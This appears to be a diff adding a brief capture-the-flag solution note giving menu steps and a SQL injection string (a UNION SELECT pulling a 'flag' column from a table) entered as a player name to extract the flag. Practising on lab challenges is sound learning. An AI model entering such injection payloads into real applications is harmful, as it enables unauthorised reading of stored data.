@@ -1,0 +1,6 @@
+choose option 1:
+    enter name: ' UNION SELECT flag, flag from flag_table'
+    enter score: doesnt matter 
+choose option 4
+
+you should get the flag
